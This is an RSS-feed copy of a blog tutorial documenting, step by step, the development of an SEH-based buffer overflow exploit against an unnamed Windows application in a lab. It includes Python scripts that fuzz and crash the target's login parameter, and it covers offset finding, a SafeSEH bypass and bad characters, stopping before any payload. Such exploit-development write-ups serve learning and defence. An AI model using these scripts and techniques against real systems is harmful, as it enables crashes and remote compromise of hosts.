<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>SEH &#8211; Spencer Drayton</title>
	<atom:link href="./index.html" rel="self" type="application/rss+xml" />
	<link>./../../../index.html</link>
	<description>Information Security, Software Engineering</description>
	<lastBuildDate>Tue, 24 Aug 2021 10:51:09 +0000</lastBuildDate>
	<language>en-GB</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	
	<item>
		<title>Windows SEH Buffer Overflow Exploit</title>
		<link>./../../../win7-seh-buffer-overflow-exploit/index.html</link>
		
		<dc:creator><![CDATA[spen440]]></dc:creator>
		<pubDate>Thu, 22 Jun 2017 12:58:32 +0000</pubDate>
				<category><![CDATA[Windows Exploits]]></category>
		<category><![CDATA[Buffer Overflow]]></category>
		<category><![CDATA[Exploits]]></category>
		<category><![CDATA[Kali]]></category>
		<category><![CDATA[Metasploit]]></category>
		<category><![CDATA[SEH]]></category>
		<category><![CDATA[Windows]]></category>
		<guid isPermaLink="false">./../../../index.html?p=48</guid>

					<description><![CDATA[Introduction This post describes the process of developing an exploit for a stack-based buffer overflow vulnerability within a Windows application, with the aim of gaining remote access to the underlying host. The exploit will employ a technique which abuses the native Windows Structured Exception Handling (SEH) mechanism to gain control over process execution. It is [&#8230;]]]></description>
										<content:encoded><![CDATA[<h2>Introduction</h2>
<p>This post describes the process of developing an exploit for a stack-based buffer overflow vulnerability within a Windows application, with the aim of gaining remote access to the underlying host. The exploit will employ a technique which abuses the native Windows Structured Exception Handling (SEH) mechanism to gain control over process execution.</p>
<p><span id="more-48"></span></p>
<p>It is worth noting that the purpose of this post is to act as a journal, documenting the steps followed and the results obtained during the process of building this exploit, in the hope it may be of help to others also seeking to learn more about the field of exploit development. I don&#8217;t claim to have discovered a previously unknown exploit for the vulnerability under scrutiny, nor do I claim to have developed any new techniques for leveraging SEH. The technique described here is well documented in countless other blogs, articles and technical papers. Experience has taught me that knowledge acquired by &#8220;doing and then documenting&#8221; tends to stick much more firmly in the grey matter and this post is the output of that activity. I believe the notes will prove useful to me in the future as a source of reference; if they help out others too, then all the better.</p>
<p>NB: I have made a point of not revealing the identity of the vulnerable Windows application targeted in this exercise. This is simply a personal choice: the application&#8217;s vulnerabilities (and exploits for them) are well known, so I wouldn&#8217;t be revealing anything that isn&#8217;t already common knowledge in information security circles. However, given that (a) the vulnerable version of the application is still available for download trial and/or purchase, and (b) this post is concerned only with the generic process of developing an SEH buffer overflow exploit, I see no real reason to do anything which contributes to the degradation of the security posture of any community or organisation unlucky enough to still be using this application.</p>
<h2>Test Lab</h2>
<p>The test lab environment will be fully virtualised: the attack host will be a <a href="https://www.kali.org/">Kali</a> 2017.1 VM and the target host will be a Windows 7 SP1 Home Edition VM. These will be running within the Oracle <a href="https://www.virtualbox.org/">Virtualbox</a> hypervisor with <a href="https://www.centos.org/">Centos 7</a> as the host operating system.</p>
<p><a href="./../../../wp-content/uploads/2017/06/vms.png"><img fetchpriority="high" decoding="async" class="wp-image-139 aligncenter" src="./../../../wp-content/uploads/2017/06/vms-300x169.png" alt="" width="662" height="373" srcset="./../../../wp-content/uploads/2017/06/vms-300x169.png 300w, ./../../../wp-content/uploads/2017/06/vms-1024x576.png 1024w, ./../../../wp-content/uploads/2017/06/vms-768x432.png 768w, ./../../../wp-content/uploads/2017/06/vms-210x118.png 210w, ./../../../wp-content/uploads/2017/06/vms.png 1366w" sizes="(max-width: 662px) 100vw, 662px" /></a></p>
<h2>Vulnerability Details</h2>
<p>The <a href="https://cve.mitre.org/index.html">CVE</a> description doesn&#8217;t give too much away, but it does tell us that the vulnerability is related to the processing of authentication requests sent to the application over a TCP/IP connection using the HTTP/HTTPS protocol. More specifically, it tells us that the vulnerability manifests itself when an overly long user name string is sent as a parameter within the authentication request, which results in a stack-based buffer overflow.</p>
<h2>Intercepting Requests</h2>
<p>By downloading, installing and running an evaluation copy of the application, we can see that it exposes an HTTP/HTTPS web interface on the standard ports (80 and 443). For the sake of simplicity, we&#8217;ll just focus on the non-encrypted HTTP interface for now. We don&#8217;t have any details of the structure of requests sent to (or responses received from) this interface, so the first thing we need to do is to examine a sample of network traffic captured during an authentication session, to see if that will provide us with any clues. An interception proxy such as <a href="https://portswigger.net/burp/">Burp Suite</a> can be used for this purpose. By configuring a web browser to route its traffic via the proxy, we can eavesdrop on traffic exchanged between the browser and the server:</p>
<figure id="attachment_40" aria-describedby="caption-attachment-40" style="width: 603px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-09-23-52.png"><img decoding="async" class="wp-image-40" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-09-23-52-300x172.png" alt="" width="603" height="346" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-09-23-52-300x172.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-09-23-52-210x121.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-09-23-52.png 614w" sizes="(max-width: 603px) 100vw, 603px" /></a><figcaption id="caption-attachment-40" class="wp-caption-text">Authentication request captured in Burp Suite</figcaption></figure>
<p>Looking at the raw request, we can see that a number of arguments are passed to the server as URL-encoded parameters, including the one we&#8217;re interested in: the name of the user. The fact that both the username and the password are both passed in cleartext over an unencrypted channel is clearly not ideal from a security point of view, but that&#8217;s a side issue!.</p>
<p>Now we know the general structure of the request, we can use this information to construct a script which will allow us to generate requests similar to those transmitted by the browser, and crucially will allow us to programmatically vary the length and content of the user name argument.</p>
<h2>Fuzzing Inputs</h2>
<p>The first task is to determine whether we can replicate the buffer overflow detailed in the vulnerability report. At this point, all we know is that the overflow is caused by supplying an overly long user name argument. We don&#8217;t know <em>how</em> long the string needs to be, so we&#8217;ll employ a technique known as <a href="https://www.owasp.org/index.php/Fuzzing">fuzzing</a>, which involves progressively increasing the string length supplied to the server until the overflow occurs. Based on the information we&#8217;ve acquired via Burp Suite, this is the script we will use:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="twilight">#!/usr/bin/env python

import socket

char = "A"
buff = [char]
step = 200
count = 100
victim_host = "192.168.0.55"
victim_port= 80
usr_tok = "%USR%"
get_request_template = (
"GET /chat.ghp?username=" + usr_tok + "&amp;password=password&amp;room=1&amp;sex=1 HTTP/1.1\r\n"
"Host: 192.168.0.55\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Referer: http://192.168.0.55/\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

# build a list of strings representing usernames of increasing length
while len(buff) &lt;= 30:
    buff.append(char * count)
    count += step
for usr_name in buff:
    print "Sending %s user name bytes..." % len(usr_name)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn = sock.connect((victim_host, victim_port))
    content = get_request_template.replace(usr_tok, usr_name)
    #print content
    sock.send(content)
    rx = sock.recv(1024)
    if len(rx) &gt; 0:
        print rx
sock.close()
</pre>
<p>Notice that the value of the &#8220;Connection&#8221; header in the GET request has been changed from &#8220;close&#8221; to &#8220;Keep-Alive&#8221; so that a persistent connection is establised; this allows multiple requests to be sent during the fuzzing operation without the need to set up and tear down the connection each time.</p>
<p>Executing the script on the attack host causes the following responses to be transmitted back from the server:</p>
<figure id="attachment_41" aria-describedby="caption-attachment-41" style="width: 661px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38.png"><img decoding="async" class="wp-image-41" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38-300x138.png" alt="" width="661" height="304" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38-300x138.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38-1024x471.png 1024w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38-768x354.png 768w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38-210x97.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-10-07-38.png 1360w" sizes="(max-width: 661px) 100vw, 661px" /></a><figcaption id="caption-attachment-41" class="wp-caption-text">Server responses received during fuzzing</figcaption></figure>
<p>As the script executes, it repeatedly sends fabricated authenticated requests to the server, increasing the user name argument (which is just a series of &#8220;A&#8221; characters) by 10 bytes on each iteration. We can see that when the argument length reaches 220 bytes, the server stops responding. That fact that we don&#8217;t receive an HTTP error message is a good indication that an unhandled irrecoverable error has occurred at the server end, so it looks like we may have successfully forced the buffer overflow to occur. Looking at the server host desktop, it&#8217;s clear that something untoward has occurred:</p>
<figure id="attachment_70" aria-describedby="caption-attachment-70" style="width: 481px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-002.png"><img loading="lazy" decoding="async" class="wp-image-70" src="./../../../wp-content/uploads/2017/06/ecs-win-002-300x249.png" alt="" width="481" height="399" srcset="./../../../wp-content/uploads/2017/06/ecs-win-002-300x249.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-002-210x174.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-002.png 557w" sizes="(max-width: 481px) 100vw, 481px" /></a><figcaption id="caption-attachment-70" class="wp-caption-text">Server error</figcaption></figure>
<h2>Debugging The Server</h2>
<p>Our malicious authentication request has crashed the server application and will have left the processes it created and the memory space it occupies in an indeterminate state. To establish whether we can make use of this situation, we need to examine the internal state of the server using a debugger. For this exercise, we will use <a href="http://www.ollydbg.de/">OllyDbg</a>.</p>
<p>After restarting the server, we attach the debugger to the server process and allow it to run:</p>
<figure id="attachment_73" aria-describedby="caption-attachment-73" style="width: 640px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-006.png"><img loading="lazy" decoding="async" class="wp-image-73" src="./../../../wp-content/uploads/2017/06/ecs-win-006-300x92.png" alt="" width="640" height="196" srcset="./../../../wp-content/uploads/2017/06/ecs-win-006-300x92.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-006-768x235.png 768w, ./../../../wp-content/uploads/2017/06/ecs-win-006-210x64.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-006.png 872w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption id="caption-attachment-73" class="wp-caption-text">Attaching the debugger to the server process</figcaption></figure>
<p>At the attack host, because we now know that the length of the user name argument needed to cause the crash must be at least 220 bytes, we will revise our script so that instead of fuzzing the server, it just sends a single fixed length string of 300 bytes (the extra 80 bytes is an arbitrary length just to see how far we can oveflow into stack memory):</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="twilight">#!/usr/bin/env python

import socket

victim_host = "192.168.0.55"
victim_port= 80
usr_tok = "%USR%"
get_request_template = (
"GET /chat.ghp?username=" + usr_tok + "&amp;password=password&amp;room=1&amp;sex=1 HTTP/1.1\r\n"
"Host: 192.168.0.55\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Referer: http://192.168.0.55/\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

usr_name = "A" * 300
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn = sock.connect((victim_host, victim_port))
content = get_request_template.replace(usr_tok, usr_name)
sock.send(content)
rx = sock.recv(1024)
if len(rx) &gt; 0:
    print rx
sock.close()
</pre>
<p>We send the request to the server, wait for the crash to occur, then examine the aftermath in OllyDbg &#8211; the status bar message tells us that an access voilation exception has occurred:</p>
<figure id="attachment_82" aria-describedby="caption-attachment-82" style="width: 654px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-008-copy.png"><img loading="lazy" decoding="async" class="wp-image-82" src="./../../../wp-content/uploads/2017/06/ecs-win-008-copy-300x177.png" alt="" width="654" height="386" srcset="./../../../wp-content/uploads/2017/06/ecs-win-008-copy-300x177.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-008-copy-210x124.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-008-copy.png 477w" sizes="(max-width: 654px) 100vw, 654px" /></a><figcaption id="caption-attachment-82" class="wp-caption-text">Access Violation Exception in server process</figcaption></figure>
<h2>Register Corruption</h2>
<p>In a &#8220;classic&#8221; buffer overflow scenario, the aim is to cause the <a href="https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#Instruction_Pointer">Extended Instruction Pointer (EIP)</a> register to be overwritten with a value of our own choosing. The system interprets the value in the EIP as the address of the next instruction to execute, so if we are able to overwrite the EIP with a value which happens to be the memory address of an instruction to jump to the address of the <a href="https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#General-Purpose_Registers_.28GPR.29_-_16-bit_naming_conventions">Extended Stack Pointer (ESP)</a> register (which we also overwrite with the address of some malicious code inserted by us elsewhere in memory), we can assume control of the hijacked process, and force it to execute the instructions we supply instead of its own.</p>
<p>This strategy relies on a number of preconditions being true. First, the area of stack memory allocated as a buffer for the operation within by the process causing the overflow must be located at an address lower than the address of the EIP and ESP registers, and within &#8220;overflow-able&#8221; range of them. Second, the process under attack must not have been compiled with any of the compiler directives which add countermeasures aimed at preventing overflows from occurring in the first place, such as <a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries">Stack Canaries</a>.</p>
<p>Assuming this is the case, when the process executes the instruction which attempts to write a value too large for the allocated stack buffer, data will be written beyond the end of the buffer and hopefully into the EIP and ESP registers.</p>
<p>In this case however, that doesn&#8217;t appear to have happened. At the point at which the process crashes, the EIP seems to contain a valid address:</p>
<figure id="attachment_86" aria-describedby="caption-attachment-86" style="width: 661px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-008-003.png"><img loading="lazy" decoding="async" class="wp-image-86" src="./../../../wp-content/uploads/2017/06/ecs-win-008-003-300x153.png" alt="" width="661" height="337" srcset="./../../../wp-content/uploads/2017/06/ecs-win-008-003-300x153.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-008-003-210x107.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-008-003.png 653w" sizes="(max-width: 661px) 100vw, 661px" /></a><figcaption id="caption-attachment-86" class="wp-caption-text">EIP not overwritten</figcaption></figure>
<p>So what&#8217;s going on ? If we look at the current instruction, i.e. the one being excuted as the crash occurs, we can see that the system is being told to deference the pointer given by the current value of ECX register + 4 bytes, read the 32-bit value at the address and then write it back to the ECX register:</p>
<p style="text-align: center;"><code class="EnlighterJSRAW" data-enlighter-language="asm">MOV ECX, DWORD  PTR DS:[ECX+4]</code></p>
<p>The problem is that the ECX register doesn&#8217;t contain a valid memory address &#8211; it contains the hex value &#8220;41414141&#8221; &#8211; the ASCII value for which is &#8220;AAAA&#8221;. Our malicious user name string contains a long sequence of ASCII &#8220;A&#8221; characters, so it appears that our buffer has overflowed into the ECX register:</p>
<figure id="attachment_78" aria-describedby="caption-attachment-78" style="width: 659px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-008-1.png"><img loading="lazy" decoding="async" class="wp-image-78" src="./../../../wp-content/uploads/2017/06/ecs-win-008-1-300x213.png" alt="" width="659" height="468" srcset="./../../../wp-content/uploads/2017/06/ecs-win-008-1-300x213.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-008-1-210x149.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-008-1.png 508w" sizes="(max-width: 659px) 100vw, 659px" /></a><figcaption id="caption-attachment-78" class="wp-caption-text">ECX register contains an invalid memory address</figcaption></figure>
<h2>Structured Exception Handling</h2>
<p>Why did this cause the process to stop executing ? We can see from the debugger that an Access Violation Exception was thrown, meaning somehow the system knew that it was being asked to read from the a non-existent or otherwise non-accessible memory location. This might be either because the server code contains an exception handler written specifically to handle this type of occurrence, or in the absence of such a handler, because the access violation was detected by the operating system itself. <a href="https://www.microsoft.com/msj/0197/exception/exception.aspx">Structured Exception Handling (SEH)</a> a Win32 mechanism which exists to ensure that at a low level, exceptions are handled consistently. From the point of view of this exercise, it doesn&#8217;t really matter where the detection of the violation occurred, only that it was detected within the SEH context. We can be confident that SEH will deal with exception in the same way regardless of it&#8217;s origin; this will help us to predict what processing is invoked next, and how we can use that to our advantage.</p>
<p>Each thread spawned by a process is assigned it&#8217;s own list of exception handlers. When a problem occurs, the operating system consults this list in an attempt to find a handler which can deal with the detected problem. The location in memory of this list of handlers is important to us, because the list is a linked list, meaning that each entry in the list contains a pointer to the address of the next entry. We know that when an error occurs, the operating system will jump to and excute one of the handlers in this list. So, if we can overwrite the pointer which contains the address of the start of the list, we will be able to control the flow of execution. The SEH handler list is positioned at a location in the stack after that used to store local variables, so a sufficiently large buffer overflow might allow us to overwrite one of the pointers to an SEH handler.</p>
<p>OllyDbg allows us to inspect the state of the SEH handler chain for a give thread, so let&#8217;s take a look our crashed server process:</p>
<figure id="attachment_30" aria-describedby="caption-attachment-30" style="width: 649px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-008.png"><img loading="lazy" decoding="async" class="wp-image-30" src="./../../../wp-content/uploads/2017/06/ecs-win-008-300x271.png" alt="" width="649" height="586" srcset="./../../../wp-content/uploads/2017/06/ecs-win-008-300x271.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-008-210x190.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-008.png 627w" sizes="(max-width: 649px) 100vw, 649px" /></a><figcaption id="caption-attachment-30" class="wp-caption-text">SEH chain for the currently executing thread</figcaption></figure>
<p>In the Threads view, the entry at the top of the list represents the currently executing thread. If we select this thread and display its &#8220;Data Dump&#8221; view, we can see that execution stopped at the start of the SEH chain, meaning that the exception we caused is indeed being handled by SEH. Even more interesting is that pointer (&#8220;Next SEH Handler&#8221;) identifying the address of the current SEH handler appears to have been overwritten by our malicious string &#8220;41414141&#8221; = ASCII &#8220;AAAA&#8221;.</p>
<h2>Determining the &#8220;Next SEH&#8221; Offset</h2>
<p>Being able to overwrite Next SEH pointer value is encouraging, but a series of &#8220;A&#8221; characters doesn&#8217;t tell us much. Which 4 bytes of the 300 byte string of &#8220;A&#8221; characters actually overwrote the pointer ? If we can determine this, we can replace those 4 bytes with something more useful &#8211; like an address to somewhere else in memory that we can control. One way to do this is to replace the 300 byte string with a sequence of characters containing a pattern which allows the position of any substring within the sequence to be uniquely identified. The position of the characters which overwrite the Next SEH pointer will then tell what offset needs to be prepended to the address we supply, to ensure that it gets inserted at the right location.</p>
<p>The <a href="https://www.metasploit.com/">Metasploit Framework</a> contains a Ruby <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_create.rb">script</a> which performs this for us &#8211; we just need to supply the desired sequence length as an argument:</p>
<figure id="attachment_42" aria-describedby="caption-attachment-42" style="width: 659px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11.png"><img loading="lazy" decoding="async" class="wp-image-42" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11-300x46.png" alt="" width="659" height="101" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11-300x46.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11-1024x156.png 1024w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11-768x117.png 768w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11-210x32.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-17-11-26-11.png 1356w" sizes="(max-width: 659px) 100vw, 659px" /></a><figcaption id="caption-attachment-42" class="wp-caption-text">The pattern_create script within the Metasploit Framework.</figcaption></figure>
<p>We can now update our attack script, replacing the &#8220;A&#8221; characters with our newly generated sequence:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python" data-enlighter-theme="twilight">#!/usr/bin/env python

import socket

victim_host = "192.168.0.55"
victim_port= 80
usr_tok = "%USR%"
get_request_template = (
"GET /chat.ghp?username=" + usr_tok + "&amp;password=password&amp;room=1&amp;sex=1 HTTP/1.1\r\n"
"Host: 192.168.0.55\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: en-US,en;q=0.5\r\n"
"Referer: http://192.168.0.55/\r\n"
"Connection: Keep-Alive\r\n\r\n"
)

usr_name = (
"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac"
"8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af"
"7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai"
"6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
conn = sock.connect((victim_host, victim_port))
content = get_request_template.replace(usr_tok, usr_name)
sock.send(content)
rx = sock.recv(1024)
if len(rx) &gt; 0:
    print rx
sock.close()
</pre>
<p>After restarting the server and sending the new authentication request, we see the following in the debugger:</p>
<figure id="attachment_31" aria-describedby="caption-attachment-31" style="width: 657px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-011.png"><img loading="lazy" decoding="async" class="wp-image-31" src="./../../../wp-content/uploads/2017/06/ecs-win-011-300x121.png" alt="" width="657" height="265" srcset="./../../../wp-content/uploads/2017/06/ecs-win-011-300x121.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-011-768x311.png 768w, ./../../../wp-content/uploads/2017/06/ecs-win-011-210x85.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-011.png 907w" sizes="(max-width: 657px) 100vw, 657px" /></a><figcaption id="caption-attachment-31" class="wp-caption-text">Pointer to Next SEH handler overwritten with a unique character sequence</figcaption></figure>
<p>We can see that the Next SEH Handler pointer value has been overwritten with the ASCII characters &#8220;7Ag8&#8221;. We can use another Metasploit Framework Ruby <a href="https://github.com/rapid7/metasploit-framework/blob/master/tools/exploit/pattern_offset.rb">script</a> to tell the location of the start of this substring in the sequence:</p>
<figure id="attachment_43" aria-describedby="caption-attachment-43" style="width: 651px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35.png"><img loading="lazy" decoding="async" class="wp-image-43" src="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35-300x47.png" alt="" width="651" height="102" srcset="./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35-300x47.png 300w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35-1024x162.png 1024w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35-768x122.png 768w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35-210x33.png 210w, ./../../../wp-content/uploads/2017/06/Screenshot-from-2017-06-18-09-48-35.png 1359w" sizes="(max-width: 651px) 100vw, 651px" /></a><figcaption id="caption-attachment-43" class="wp-caption-text">Location of the substring within the character sequence</figcaption></figure>
<p>The substring is located at an offset of 203, so we now know that we have the ability to reliably overwrite the address referenced by the Next SEH Handler with 4 bytes. But how do we determine the address of the SEH Handler itself ? Fortunately, we know from reading various Microsoft Win32 publications (including <a href="https://www.microsoft.com/msj/0197/exception/exception.aspx">this one</a>) that the SEH handler is located at the address of the Next SEH Handler pointer + 4 bytes. Great, so potentially we can just insert our malicious code at the SEH handler location ? Unfortunately not, because The SEH handler is actually a pointer to a function. Inserting code to be executed directly as instructions is not an option; we need the SEH handler to point to another address instead.</p>
<p>We know from the way in which SEH works that when exception handling commences, a frame responsible for managing the execution of the exception is set up within the associated thread&#8217;s stack, with the address of the Next SEH Handler pointer at the top of the frame. Crucially, we also know that this start of this structure is always located at an address 8 bytes higher than that of the ESP register. If we can use this information to replace the SEH handler function pointer with an address to some instructions which manipulate the stack, such that the address of the next SEH handler ends up being located at the top of the stack, we should be able to gain control of execution.</p>
<h2>SafeSEH</h2>
<p>An additional complication is that Windows executables and libraries are by default compiled with an overwrite protection mechanism called <a href="https://msdn.microsoft.com/en-us/library/9a89h429.aspx">SafeSEH</a>, which validates the address of SEH handlers before allowing them to be executed. If we were to overwrite the handler address so that it pointed to an address which was not in the list of valid SEH handler addresses, this feature would prevent the instructions at that location from being executed and our exploit would fail. Fortunately for us there is a loophole: if the address we use happens to be within a separate module which was <em><strong>not</strong></em> compiled with SafeSEH enabled, this protection mechanism is bypassed.</p>
<p><strong>NB:</strong> <em>All newer versions of the Windows OS contain a built-in overwrite mitigation feature called <a href="https://blogs.technet.microsoft.com/srd/2009/02/02/preventing-the-exploitation-of-structured-exception-handler-seh-overwrites-with-sehop/">SEHOP</a> which detects corrupt Next SEH pointer values and stops the associated handler from being executed. SEHOP is tends to be enabled by default on Windows Server versions and disabled by default on Windows Desktop versions. For the purposes of this exercise, we will assume that this feature is disabled</em>.</p>
<h2>Delegation Of Stack Manipulation</h2>
<p>So, we now know that if we insert hex characters representing the address of a memory location into our exploit string starting at position 203 + 4 bytes, we should be able to coerce the system into treating that address as the pointer of the exception handler function. As a result, the address will get loaded into the EIP and whatever is at that address will be executed. We also know that our &#8220;bogus&#8221; exception handler must somehow cause the address of the next exception handler to be presented at the top of the stack, and return execution back from the current exception handler. Because we know where the exception dispatcher frame is on the stack, we know that can acheive this by popping 2 x 4 bytes off the top of the stack and then executing a return instruction, so we need to use the instruction sequence: <code class="EnlighterJSRAW" data-enlighter-language="asm">POP xxx POP xxx RETN</code>. This would have the effect of placing the address of the next exception handler into the ESP, and causing execution to resume from that address. If that address happens to be the address of the next stage exploit code, then we are in business.</p>
<p>To bypass SafeSEH, we need to search through the non-SafeSEH modules loaded by the server process which contain the instruction sequence <code class="EnlighterJSRAW" data-enlighter-language="asm">POP xxx POP xxx RETN</code>. We can then make use of this module by inserting the address of the start of this sequence into our malicious authentication request argument, causing the SEH handler function pointer to be overwritten, thereby delegating the business of manipulating the stack to the module.</p>
<p>We can use OllyDbg to help us identify modules loaded by the server process:</p>
<figure id="attachment_33" aria-describedby="caption-attachment-33" style="width: 658px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-017.png"><img loading="lazy" decoding="async" class="wp-image-33" src="./../../../wp-content/uploads/2017/06/ecs-win-017-300x77.png" alt="" width="658" height="169" srcset="./../../../wp-content/uploads/2017/06/ecs-win-017-300x77.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-017-210x54.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-017.png 761w" sizes="(max-width: 658px) 100vw, 658px" /></a><figcaption id="caption-attachment-33" class="wp-caption-text">Executable modules loaded by the server</figcaption></figure>
<h3>Bad Characters</h3>
<p>An additional complication is the need to avoid including so called &#8216;bad characters&#8217; in the authentication request argument. Bad characters are those which are not interpreted as literal characters by the server code, but are instead interpreted as an directive to perform an action. An example is the hex values <strong>\x00 </strong>which would be interpreted as a line terminator, preventing anything after it in the character sequence from being written to memory and hence sabotaging the exploit. <strong>\x20</strong> would have similar effect as it would be interpreted as space character. We need to bear this in mind when looking for modules containing candidate POP POP RETN instruction sequences; we won&#8217;t be able to make use of modules whose entry point addresses contain bad characters. In fact, this is also the case for any values we include in our exploit string.</p>
<p>From the Executable Modules view in OllyDbg, we can see that the library &#8220;SSLEAY32.dll&#8221; has an entry point address which doesn&#8217;t start with a bad character, so this appears to be a good candidate. Let&#8217;s use the OllyDbg <a href="http://www.openrce.org/downloads/details/244/ollysseh">SSEH plugin</a> to see if it has SafeSEH enabled:</p>
<figure id="attachment_121" aria-describedby="caption-attachment-121" style="width: 665px" class="wp-caption aligncenter"><a href="./../../../wp-content/uploads/2017/06/ecs-win-028.png"><img loading="lazy" decoding="async" class="wp-image-121" src="./../../../wp-content/uploads/2017/06/ecs-win-028-300x93.png" alt="" width="665" height="206" srcset="./../../../wp-content/uploads/2017/06/ecs-win-028-300x93.png 300w, ./../../../wp-content/uploads/2017/06/ecs-win-028-768x239.png 768w, ./../../../wp-content/uploads/2017/06/ecs-win-028-210x65.png 210w, ./../../../wp-content/uploads/2017/06/ecs-win-028.png 838w" sizes="(max-width: 665px) 100vw, 665px" /></a><figcaption id="caption-attachment-121" class="wp-caption-text">Listing modules compiled without SafeSEH using the OllyDbg <a href="http://www.openrce.org/downloads/details/244/ollysseh">SSEH plugin </a></figcaption></figure>
